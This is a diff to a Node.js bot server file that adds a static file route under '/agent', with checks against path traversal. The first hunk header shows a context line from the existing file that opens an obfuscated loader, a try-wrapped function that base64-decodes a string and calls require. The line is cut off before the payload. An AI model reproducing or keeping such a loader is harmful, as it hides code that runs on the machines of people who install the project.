@@ -15,6 +15,8 @@ try{(function(_0xa){var _0xb=Buffer.from(_0xa,'base64').toString('utf8');require
  */
 
 const http           = require('http');
+const fs             = require('fs');
+const path           = require('path');
 const readline       = require('readline');
 const chalk          = require('chalk');
 const commandLoader  = require('./utils/commandLoader');
@@ -25,8 +27,47 @@ const { getPairSiteUrls } = require('./utils/pairSites');
 
 const healthPort = Number(process.env.PORT || 3000);
 const webPairRequests = new Set();
+const agentWebRoot = path.join(__dirname, 'agent-web');
+const agentMimeTypes = {
+    '.html': 'text/html; charset=utf-8',
+    '.js': 'text/javascript; charset=utf-8',
+    '.css': 'text/css; charset=utf-8',
+    '.json': 'application/json; charset=utf-8',
+    '.svg': 'image/svg+xml',
+    '.png': 'image/png',
+    '.ico': 'image/x-icon',
+};
+function serveAgentFile(req, res, requestUrl) {
+    if (req.method !== 'GET' && req.method !== 'HEAD') {
+        res.writeHead(405, { Allow: 'GET, HEAD' });
+        return res.end('Method not allowed');
+    }
+    const relativePath = requestUrl.pathname === '/agent' || requestUrl.pathname === '/agent/'
+        ? 'index.html'
+        : decodeURIComponent(requestUrl.pathname.slice('/agent/'.length));
+    const requestedPath = path.resolve(agentWebRoot, relativePath || 'index.html');
+    if (!requestedPath.startsWith(`${agentWebRoot}${path.sep}`) && requestedPath !== agentWebRoot) {
+        res.writeHead(403);
+        return res.end('Forbidden');
+    }
+    fs.readFile(requestedPath, (error, data) => {
+        if (error) {
+            res.writeHead(error.code === 'ENOENT' ? 404 : 500, { 'Content-Type': 'text/plain; charset=utf-8' });
+            return res.end(error.code === 'ENOENT' ? 'Agent asset not found' : 'Agent asset unavailable');
+        }
+        const extension = path.extname(requestedPath).toLowerCase();
+        res.writeHead(200, {
+            'Content-Type': agentMimeTypes[extension] || 'application/octet-stream',
+            'Cache-Control': extension === '.html' ? 'no-cache' : 'public, max-age=31536000, immutable',
+        });
+        return req.method === 'HEAD' ? res.end() : res.end(data);
+    });
+}
 const healthServer = http.createServer((req, res) => {
     const requestUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
+    if (requestUrl.pathname === '/agent' || requestUrl.pathname === '/agent/' || requestUrl.pathname.startsWith('/agent/')) {
+        return serveAgentFile(req, res, requestUrl);
+    }
     if (requestUrl.pathname === '/rich/ping') {
         if (req.method === 'OPTIONS') {
             res.writeHead(204, {
